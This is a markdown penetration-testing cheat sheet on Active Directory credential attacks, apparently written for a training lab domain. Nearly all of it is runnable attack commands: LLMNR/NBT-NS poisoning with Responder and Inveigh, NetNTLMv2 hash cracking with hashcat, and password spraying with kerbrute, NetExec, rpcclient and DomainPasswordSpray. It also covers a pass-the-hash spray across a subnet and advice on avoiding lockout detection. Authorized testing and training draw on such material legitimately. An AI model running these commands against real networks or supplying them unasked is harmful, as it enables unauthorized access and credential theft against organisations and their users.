#ad #password-spraying #llmnr #responder #inveigh

# Password Spraying & LLMNR Poisoning

Related: [credentialed-enumeration](credentialed-enumeration.md) · [netexec](NetExec.md) · [password-attacks](../Passwords/password-attacks.md) · [traffic-analysis](../Network/traffic-analysis.md) · [ntlm-relay](ntlm-relay.md)

## Contents
- [Enumerate Password Policy](#enumerate-password-policy)
- [LLMNR / NBT-NS / MDNS Poisoning](#llmnr--nbt-ns--mdns-poisoning)
- [Password Spraying](#password-spraying)
- [Username Generation](#username-generation)

> [!WARNING]
> Always enumerate the lockout threshold first and spray one password per user per round (never brute-force a single user) — one bad spray can lock out the entire user base. Pass-the-hash sprays against a *subnet* (one attempt/host, not per-user) sidestep account lockout entirely since each host only sees a single attempt.

## Enumerate Password Policy
```bash
nxc smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
```
Enumerate the password policy with valid creds.

```bash
rpcclient -U "" -N 172.16.5.5
```
Connect via NULL session (then `querydominfo`).

```bash
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```
Enumerate the password policy via LDAP.

```cmd
net accounts
```
Enumerate password policy (Windows, local).

## LLMNR / NBT-NS / MDNS Poisoning
```bash
sudo responder -I ens224 -A
```
Passive analyze mode (no poisoning).

```bash
sudo responder -I ens224
```
Active poisoning mode (capture NetNTLM hashes).

```bash
hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt
```
Crack captured NetNTLMv2 hashes. See [hashcat](../Passwords/hashcat.md).

```powershell
Import-Module .\Inveigh.ps1
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```
Windows LLMNR/NBNS spoofer (PowerShell).

```cmd
.\Inveigh.exe
```
C# implementation of Inveigh.

## Password Spraying
```bash
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
```
Spray one password across users via Kerberos.

```bash
sudo nxc smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```
Spray with NetExec, filter successes.

```bash
sudo nxc smb --local-auth 172.16.5.0/24 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```
Spray a local-admin hash across a subnet (one attempt/host, avoids lockout).

```bash
for u in $(cat valid_users.txt); do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```
Spray via rpcclient one-liner.

```powershell
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```
Spray from a domain-joined Windows host.

## Username Generation
```bash
./kerbrute_linux_amd64 userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o kerb-results
```
Validate usernames against the KDC.
